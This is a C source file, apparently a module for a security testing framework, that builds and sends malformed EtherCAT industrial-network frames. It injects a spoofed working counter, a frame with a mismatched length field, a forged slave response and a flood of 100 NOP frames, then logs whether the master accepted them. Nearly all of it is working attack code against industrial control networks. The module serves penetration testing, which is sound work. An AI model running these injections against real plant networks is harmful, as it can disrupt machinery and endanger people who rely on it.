
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#include "kraken_module_abi.h"
#include "kraken_module_abi_v2.h"

#define ECAT_TYPE 1 

#define KRAKEN_SIG "KRKN"
#define KRAKEN_SIG_LEN 4

static size_t build_frame(uint8_t *buf, uint8_t cmd, uint16_t addr, uint16_t offset,
                          const uint8_t *data, uint16_t data_len, uint16_t wkc) {
   
    uint16_t total_data_len = data_len + KRAKEN_SIG_LEN;

   
    uint16_t frame_len = 10 + total_data_len + 2;
    uint16_t header = (frame_len & 0x7FF) | (ECAT_TYPE << 12);
    buf[0] = header & 0xFF;
    buf[1] = (header >> 8) & 0xFF;

   
    buf[2] = cmd;          
    buf[3] = 0x01;         
    buf[4] = addr & 0xFF;  
    buf[5] = (addr >> 8);  
    buf[6] = offset & 0xFF;
    buf[7] = (offset >> 8);

   
    uint16_t len_flags = total_data_len & 0x7FF;
    buf[8] = len_flags & 0xFF;
    buf[9] = (len_flags >> 8) & 0xFF;

   
    buf[10] = 0;
    buf[11] = 0;

   
    memcpy(buf + 12, KRAKEN_SIG, KRAKEN_SIG_LEN);
    if (data && data_len > 0) {
        memcpy(buf + 12 + KRAKEN_SIG_LEN, data, data_len);
    } else if (data_len > 0) {
        memset(buf + 12 + KRAKEN_SIG_LEN, 0, data_len);
    }

   
    buf[12 + total_data_len] = wkc & 0xFF;
    buf[12 + total_data_len + 1] = (wkc >> 8) & 0xFF;

    return 2 + frame_len;
}

typedef struct {
    const char *name;
    const char *description;
    int (*test_fn)(KrakenConnectionHandle, const KrakenConnectionOps*, KrakenRunResultV2*);
} test_case_t;

static int test_spoofed_wkc(KrakenConnectionHandle conn, const KrakenConnectionOps *ops, KrakenRunResultV2 *result) {
    uint8_t frame[64];
    uint8_t data[2] = {0};

   
    size_t len = build_frame(frame, 7, 0, 0, data, 2, 99);

    int64_t sent = ops->send(conn, frame, len, 100);
    if (sent < 0) {
        add_log_v2(result, "  Failed to send spoofed WKC frame");
        return -1;
    }

    add_log_v2(result, "  Sent BRD with spoofed WKC=99");
    return 0;
}

static int test_invalid_length(KrakenConnectionHandle conn, const KrakenConnectionOps *ops, KrakenRunResultV2 *result) {
    uint8_t frame[64];

   
    uint16_t header = (100 & 0x7FF) | (ECAT_TYPE << 12);
    frame[0] = header & 0xFF;
    frame[1] = (header >> 8) & 0xFF;

   
    frame[2] = 7; 
    frame[3] = 1; 
    memset(frame + 4, 0, 8);
    frame[8] = 2; 
    frame[12] = 0;
    frame[13] = 0;
    frame[14] = 0;
    frame[15] = 0;

    int64_t sent = ops->send(conn, frame, 16, 100);
    if (sent < 0) {
        add_log_v2(result, "  Failed to send invalid length frame");
        return -1;
    }

    add_log_v2(result, "  Sent frame with mismatched length field");
    return 0;
}

static int test_slave_impersonation(KrakenConnectionHandle conn, const KrakenConnectionOps *ops, KrakenRunResultV2 *result) {
    uint8_t frame[64];
    uint8_t data[2] = {0x12, 0x34};

   
    size_t len = build_frame(frame, 4, 0x1000, 0, data, 2, 1);

    int64_t sent = ops->send(conn, frame, len, 100);
    if (sent < 0) {
        add_log_v2(result, "  Failed to send impersonation frame");
        return -1;
    }

    add_log_v2(result, "  Sent FPRD response impersonating slave 0x1000");
    return 0;
}

static int test_nop_flood(KrakenConnectionHandle conn, const KrakenConnectionOps *ops, KrakenRunResultV2 *result) {
    uint8_t frame[64];
    size_t len = build_frame(frame, 0, 0, 0, NULL, 0, 0);

    int sent_count = 0;
    for (int i = 0; i < 100; i++) {
        if (ops->send(conn, frame, len, 10) > 0) {
            sent_count++;
        }
    }

    char buf[64];
    snprintf(buf, sizeof(buf), "  Sent %d NOP frames", sent_count);
    add_log_v2(result, buf);

    return sent_count > 0 ? 0 : -1;
}

static test_case_t tests[] = {
    {"spoofed_wkc", "Inject frame with spoofed working counter", test_spoofed_wkc},
    {"invalid_length", "Inject frame with invalid length field", test_invalid_length},
    {"slave_impersonation", "Inject frame impersonating slave response", test_slave_impersonation},
    {"nop_flood", "Flood with NOP frames", test_nop_flood},
};

#define NUM_TESTS (sizeof(tests) / sizeof(tests[0]))

KRAKEN_API int kraken_run_v2(
    KrakenConnectionHandle conn,
    const KrakenConnectionOps *ops,
    const KrakenTarget *target,
    uint32_t timeout_ms,
    const char *params_json,
    KrakenRunResultV2 **out_result
) {
    (void)timeout_ms;
    (void)params_json;

    KrakenRunResultV2 *result = calloc(1, sizeof(KrakenRunResultV2));
    if (!result) return -1;
    copy_target(&result->target, target);

    add_log_v2(result, "Starting EtherCAT frame injection tests");

    int passed = 0;
    int failed = 0;

    for (size_t i = 0; i < NUM_TESTS; i++) {
        char buf[128];
        snprintf(buf, sizeof(buf), "Test: %s", tests[i].name);
        add_log_v2(result, buf);

        int ret = tests[i].test_fn(conn, ops, result);
        if (ret == 0) {
            passed++;
            add_log_v2(result, "  PASS: Frame injected");
        } else {
            failed++;
            add_log_v2(result, "  FAIL: Could not inject");
        }
    }

    char summary[128];
    snprintf(summary, sizeof(summary), "Results: %d/%zu tests passed", passed, NUM_TESTS);
    add_log_v2(result, summary);

   
    KrakenFindingV2 finding = {0};
    finding.id = mystrdup("ecat-injection");
    finding.module_id = mystrdup("ecat_inject");
    finding.success = (passed > 0);
    finding.title = mystrdup("EtherCAT Frame Injection");
    finding.severity = mystrdup(passed > 0 ? "medium" : "info");

    snprintf(summary, sizeof(summary),
             "Injected %d/%zu test frames. Master accepts injected EtherCAT frames on the network.",
             passed, NUM_TESTS);
    finding.description = mystrdup(summary);
    finding.timestamp = (int64_t)time(NULL);
    copy_target(&finding.target, target);

    add_finding_v2(result, &finding);

    *out_result = result;
    return 0;
}

KRAKEN_API void kraken_free_v2(void *p) {
    if (!p) return;
    KrakenRunResultV2 *r = (KrakenRunResultV2 *)p;

    for (size_t i = 0; i < r->logs.count; i++)
        free((void *)r->logs.strings[i]);
    free((void *)r->logs.strings);

    for (size_t i = 0; i < r->findings_count; i++) {
        KrakenFindingV2 *f = &r->findings[i];
        free((void *)f->id);
        free((void *)f->module_id);
        free((void *)f->title);
        free((void *)f->severity);
        free((void *)f->description);
        free_target(&f->target);
    }
    free(r->findings);
    free_target(&r->target);
    free(r);
}
